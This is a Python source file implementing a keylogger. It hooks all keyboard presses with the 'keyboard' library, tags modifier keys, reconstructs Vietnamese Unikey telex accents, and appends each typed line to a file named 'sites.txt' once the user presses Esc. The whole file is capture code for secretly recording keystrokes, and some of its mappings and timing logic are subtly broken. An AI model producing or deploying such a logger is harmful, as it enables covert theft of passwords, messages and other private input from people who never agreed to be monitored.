import keyboard
import psutil
from pprint import pprint

#https://github.com/boppreh/keyboard#api

#keyboard.press_and_release('shift+s, space')
#keyboard.write('The quick brown fox jumps over the lazy dog.')
#keyboard.wait('esc')
special = {'enter' :'[en]\n',
           'backspace' : '[<-]',
           'space' : ' ',
           'menu' : '[M]',
           'tab' : '[T]',
           'alt' : '[A]',
           'alt gr' : '[A]',
           'ctrl' : '[C]',
           'left alt' : '[A]' ,
           'left ctrl' : '[C]',
           'left shift' : '[S]',
           'left windows' : '[W]',
           'right alt' : '[A]',
           'right ctrl': '[C]',
           'right shift' : '[S]',
           'right windows': '[W]',
           'shift': '[S]',
           'windows': '[W]'}
unikey = {'aa':'â',
          'aw':'ă',
          
          'âs':'ấ',
          'ăs':'ắ',
          'as':'á',
          
          'âr':'ẩ',
          'ăr':'ẩ',
          'ar':'ả',
          
          'âj':'ậ',
          'ăj':'ặ',
          'aj':'ạ',
          
          'âf':'ầ',
          'ăf':'ằ',
          'af':'à',
          
          'âx':'ẫ',
          'ăx':'ẵ',
          'ax':'ã'}
line = ['']
old = ''
def read(result):
    f = open("sites.txt", "r")
    for line in f:
        result.append(line)
    f.close()
def write(result ,method = "a"):    
    f = open("sites.txt", method) 
    f.write(result.encode('cp1257').decode())
    f.close()
def unikeyDetect(now):
    global old 
    PROCNAME = ['Unikey',
            'unikey',
            'UniKey',
            'uniKey']
    isRun = False 
    for proc in psutil.process_iter():
#    print(proc.name())
        for p in PROCNAME:
            if p in proc.name():
                isRun = True
    diff = old['time'] - now['time']
    if diff < 0.01 and isRun:
        return True
    return False
    
        


def process(v):
    global line , old 
    s = v['name']
    if len(s) > 1:
        tmp = special.keys() 
        if s == 'backspace':
            u = unikeyDetect(v)
            if u:
                a = line.pop()
                b = line.pop()
                print(unikey[a+b])
                line.append(unikey[a+b])
            else:
                line.pop()
        elif s == 'enter' or 'alt' in s :
            write(''.join(line))
            print(''.join(line))
            line = ['']
        elif s in tmp:
            line.append(special[s])
        else :
            line.append('['+s+']')
    else:
        line.append(s)
    old = v


            
            
alpha = "acbdefghijklmnopqrstuvwxyz0123456789`1234567890-=~!@#$%^&*()_+[]\{}|;':\",./<>?"

keyboard.wait('esc') # preesss to continue 
write("","w")   # recreate file :3
keyboard.on_press(lambda x: process(vars(x)))

